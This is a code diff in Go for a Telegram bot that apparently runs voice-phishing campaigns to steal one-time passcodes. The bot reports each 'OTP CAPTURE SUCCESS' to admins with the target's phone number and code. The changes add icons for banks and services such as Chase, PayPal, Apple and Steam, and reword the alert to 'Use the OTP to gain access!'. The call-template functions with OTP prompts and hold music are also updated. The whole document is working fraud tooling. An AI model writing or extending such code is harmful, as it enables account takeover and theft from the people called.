@@ -270,28 +270,45 @@ func (b *Bot) notifyCapture(campaignID int64, phone, otp, service string) {
 		return
 	}
 
+	// Get service icon
+	serviceIcon := "🔓"
+	switch strings.ToLower(service) {
+	case "chase", "bank_of_america", "wells_fargo", "citi":
+		serviceIcon = "🏦"
+	case "paypal", "amazon", "netflix":
+		serviceIcon = "🛒"
+	case "apple":
+		serviceIcon = "🍎"
+	case "google":
+		serviceIcon = "🔍"
+	case "steam":
+		serviceIcon = "🎮"
+	}
+
 	for _, adminID := range cfg.AdminIDs {
-		text := fmt.Sprintf(`🔥━━━━━━━━━━━━━━━━━━━━━━━━━━🔥
+		text := fmt.Sprintf(`🔥━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🔥
 
-🎯 *OTP CAPTURE SUCCESS!*
+%s *OTP CAPTURE SUCCESS!* %s
 
-━━━━━━━━━━━━━━━━━━━━━━━━━━
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-🏷️ *SERVICE:* %s
-📱 *VICTIM:* %s
-🔐 *OTP:* ||%s||
+🎫 *SERVICE:* %s
+📱 *TARGET:* %s
+🔐 *OTP CODE:* ||%s||
 
-━━━━━━━━━━━━━━━━━━━━━━━━━━
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-⏱️ *Time:* %s
-💎 *Status:* VERIFIED ✓
+⏱️ *Captured:* %s
+💎 *Status:* ✓ VERIFIED
 
-━━━━━━━━━━━━━━━━━━━━━━━━━━
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-🎰 *Action Required:*
-Verify the OTP now!
+🎯 *Next Step:*
+Use the OTP to gain access!
 
-🔥━━━━━━━━━━━━━━━━━━━━━━━━━━🔥`, 
+🔥━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🔥`, 
+			serviceIcon,
+			serviceIcon,
 			strings.ToUpper(service), 
 			maskPhone(phone), 
 			otp, 
@@ -363,7 +380,7 @@ func (b *Bot) addTemplate(msg *tgbotapi.Message) {
 		return
 	}
 
-	_, err := b.db.CreateTemplate(name, voice, greeting, actionPrompt, otpPrompt, confirmation, fallback, holdMusic)
+	_, err := b.db.CreateTemplate(name, voice, greeting, actionPrompt, otpPrompt, confirmation, fallback, holdMusic, "other", "📱")
 	if err != nil {
 		b.sendMessage(msg.Chat.ID, fmt.Sprintf("❌ Failed to create template: %v", err))
 		return
@@ -397,7 +414,7 @@ func (b *Bot) editTemplate(msg *tgbotapi.Message) {
 		return
 	}
 
-	err := b.db.UpdateTemplate(name, voice, greeting, actionPrompt, otpPrompt, confirmation, fallback, holdMusic)
+	err := b.db.UpdateTemplate(name, voice, greeting, actionPrompt, otpPrompt, confirmation, fallback, holdMusic, "other", "📱")
 	if err != nil {
 		b.sendMessage(msg.Chat.ID, fmt.Sprintf("❌ Failed to update template: %v", err))
 		return
